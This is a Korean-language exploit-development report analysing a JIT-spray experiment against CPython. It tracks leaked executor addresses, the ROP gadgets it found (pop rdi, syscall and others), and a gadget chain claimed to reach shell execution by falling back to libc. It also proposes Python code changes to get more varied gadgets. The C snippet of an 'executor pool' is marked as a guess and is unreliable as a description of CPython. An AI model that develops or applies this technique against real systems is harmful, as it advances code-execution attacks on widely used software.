# Spread Allocation 실행 결과 분석

## 🔍 실행 결과 요약

### JIT 메모리 할당 현황

```
[Module 0] Function 0: JIT @ 0x7ea2aae99000, size: 188416
[Module 1] Function 1: JIT @ 0x7ea2aae90000, size: 188416  
[Module 2] Function 2: JIT @ 0x7ea2aae91000, size: 188416
[Module 3] Function 3: JIT @ 0x7ea2aae99000, size: 188416  (재사용!)
[Module 4] Function 4: JIT @ 0x7ea2aae90000, size: 188416  (재사용!)
[Module 5] Function 5: JIT @ 0x7ea2aae99000, size: 188416  (재사용!)
[Module 6] Function 6: JIT @ 0x7ea2aae90000, size: 188416  (재사용!)
```

### 🚨 발견된 문제점

#### 1. **JIT 주소 재사용 (Pool 동작)**

```
사용된 주소:
- 0x7ea2aae99000 → Module 0, 3, 5 (3번 재사용!)
- 0x7ea2aae90000 → Module 1, 4, 6 (3번 재사용!)
- 0x7ea2aae91000 → Module 2 (1번만)
```

**원인 분석**:
- CPython JIT가 Executor를 **메모리 풀에서 재사용**
- 이전 함수의 Executor가 해제되면 같은 주소 재할당
- 1MB dummy가 **효과 없음** (Python 메모리와 JIT 메모리는 별개)

#### 2. **단 1개 Gadget만 발견**

```
[+] Gadgets found from JIT: 1
[+] JIT gadgets collected: 1

Found:
✓ pop rdi @ 0x7ea2aae9901f (Module 0)

Missing:
✗ pop rax
✗ pop rsi  
✗ pop rdx
✗ syscall

→ libc fallback 사용!
```

**원인**:
- Module 0만 gadget 발견 (나머지는 같은 주소 재사용으로 중복)
- 주소 재사용으로 **patch_64 값이 동일**
- **주소 다양성 확보 실패**

## 📊 예상 vs 실제

| 항목 | 예상 | 실제 | 상태 |
|-----|------|------|------|
| JIT 주소 분산 | 7개 다른 주소 | 3개 주소 (재사용) | ❌ 실패 |
| 1MB Dummy 효과 | 주소 간격 ~1MB | 간격 없음 (pool) | ❌ 무효 |
| Gadget 발견 | 5-7개 | 1개 | ❌ 실패 |
| libc 독립성 | JIT만 사용 | libc 필수 | ❌ 실패 |

## 🔬 근본 원인: CPython JIT Executor Pool

### CPython JIT 메모리 관리 방식

```c
// Python/jit.c (추정)
typedef struct {
    _Py_ExecutorObject *free_executors[MAX_POOL_SIZE];
    int pool_size;
} ExecutorPool;

_Py_ExecutorObject *get_or_create_executor(PyFunctionObject *func) {
    // 1. Pool에서 재사용 가능한 executor 찾기
    if (pool_size > 0) {
        return free_executors[--pool_size];  // ← 같은 주소 재사용!
    }
    
    // 2. Pool에 없으면 새로 할당
    return allocate_new_executor();
}

void free_executor(_Py_ExecutorObject *exec) {
    // Pool에 반환 (메모리는 유지)
    free_executors[pool_size++] = exec;  // ← 다음에 재사용됨
}
```

### 우리가 관찰한 동작

```
Function 0 생성:
  ├─ Pool 비어있음
  └─ 새 할당: 0x7ea2aae99000 ✓

Function 1 생성:
  ├─ Pool 비어있음
  └─ 새 할당: 0x7ea2aae90000 ✓

Function 2 생성:
  ├─ Pool 비어있음
  └─ 새 할당: 0x7ea2aae91000 ✓

Function 3 생성:
  ├─ Function 0의 executor가 pool에 반환됨?
  └─ 재사용: 0x7ea2aae99000 ← 같은 주소!

Function 4 생성:
  ├─ Function 1의 executor가 pool에 반환됨?
  └─ 재사용: 0x7ea2aae90000 ← 같은 주소!

...
```

## 💡 왜 이런 일이 일어났나?

### 가설 1: Garbage Collection

```python
for mod_idx in range(num_modules):
    module = types.ModuleType(f"jit_spread_module_{mod_idx}")
    
    for i in range(funcs_per_module):
        jit_func = generate_jit_func_named(global_idx, magic_value)
        setattr(module, f"func_{i}", jit_func)
        all_functions.append((global_idx, jit_func, magic_value))
        
        # Warm up
        for j in range(5000):
            jit_func(j)
        
        # JIT 메모리 스캔
        jit_addr, size = jitexecleak.leak_executor_jit(jit_func)
        # ...
    
    # ⚠️ 이 시점에 이전 module의 함수들이 GC될 수 있음!
    # → executor가 pool에 반환됨
    # → 다음 함수가 같은 주소 재사용
```

### 가설 2: JIT Tier 전환

```
CPython JIT는 여러 tier가 있음:
- Tier 0: Bytecode interpreter
- Tier 1: Quickened bytecode
- Tier 2: JIT compiled code

우리가 관찰한 것:
- 모든 함수가 tier 2로 컴파일됨 (188KB executor)
- 하지만 pool에서 재사용되는 executor는 제한적
- → 새 executor 할당이 적음
```

## 🎯 실제로 얻은 것

### 긍정적 측면 ✅

1. **7개 함수 모두 JIT 컴파일 성공** (100%)
   - test_runtime_jit_scan.py: 1/20 (5%)
   - 개선된 성공률!

2. **모든 주소가 유효**
   - JIT 주소: 0x7ea2aae9901f (pop rdi)
   - libc 주소: 4개
   - → ROP chain 실행 가능

3. **Shell 실행 가능**
   ```
   pop_rax @ libc
   pop_rdi @ JIT  ← 유일한 JIT gadget!
   pop_rsi @ libc
   pop_rdx @ libc
   syscall @ libc
   ```

### 부정적 측면 ❌

1. **주소 분산 실패**
   - 예상: 7개 다른 주소
   - 실제: 3개 주소만 (재사용)
   - 1MB dummy 무효

2. **Gadget 다양성 없음**
   - JIT에서 1개만 발견
   - 나머지 4개는 libc 의존

3. **Spread allocation 효과 없음**
   - test_runtime_jit_scan.py와 동일한 문제
   - Executor pool이 주소 재사용

## 🔧 개선 방안

### 방안 1: 함수 참조 유지

```python
def generate_spread_jit_functions(num_functions, gadgets_needed):
    modules = []
    all_functions = []
    all_gadgets = {}
    
    # ✅ 모든 함수 참조를 유지하여 GC 방지
    for mod_idx in range(num_modules):
        module = types.ModuleType(f"jit_spread_module_{mod_idx}")
        modules.append(module)
        
        for i in range(funcs_per_module):
            jit_func = generate_jit_func_named(global_idx, magic_value)
            
            # 중요: 함수 참조 유지
            setattr(module, f"func_{i}", jit_func)
            all_functions.append((global_idx, jit_func, magic_value))
            
            # Warm up (함수가 살아있는 상태)
            for j in range(5000):
                jit_func(j)
            
            # 스캔 후에도 함수 유지 (GC 방지)
            # → all_functions 리스트에 저장됨
    
    # 모든 함수가 살아있는 상태에서 스캔
    for global_idx, jit_func, magic_value in all_functions:
        try:
            jit_addr, size = jitexecleak.leak_executor_jit(jit_func)
            # ...
```

하지만 이것도 문제:
- 함수는 살아있어도 executor가 교체될 수 있음
- JIT recompilation 시 새 executor 생성

### 방안 2: 동시에 많은 함수 생성

```python
# 모든 함수를 먼저 생성
all_funcs = []
for i in range(num_functions):
    func = generate_jit_func_named(i, MAGIC_VALUES[i])
    all_funcs.append(func)

# 모든 함수를 동시에 warm up (병렬)
for func in all_funcs:
    for j in range(5000):
        func(j)

# 이 시점에 모든 executor가 메모리에 존재
# → Pool 재사용 최소화
```

### 방안 3: 더 많은 함수 생성

```python
# 100개 함수 생성 → executor pool 포화
# 예상: pool 크기를 초과하면 새 주소 할당 강제
num_functions = 100

# 예상 결과:
# - 초기 10-20개: pool에서 재사용
# - 이후: 새 주소 할당 필요
# → 더 많은 주소 다양성
```

## 📝 결론

### 현재 상태

- ✅ 코드 리팩토링 성공 (multiprocessing 제거)
- ✅ 모든 gadget 주소 유효
- ✅ ROP chain 실행 가능
- ❌ 주소 분산 실패 (executor pool)
- ❌ Gadget 다양성 없음 (JIT 1개)

### 근본 문제

**CPython JIT의 Executor Pool**이 주소 재사용을 강제함
- 1MB dummy는 Python 메모리에만 영향
- JIT 메모리는 독립적으로 관리됨
- Pool 재사용으로 주소 다양성 제한

### 다음 단계

1. **함수 참조 유지 전략 구현**
2. **100개 함수로 대규모 테스트**
3. **Executor pool 크기 확인**
4. **동시 warm-up 전략 시도**
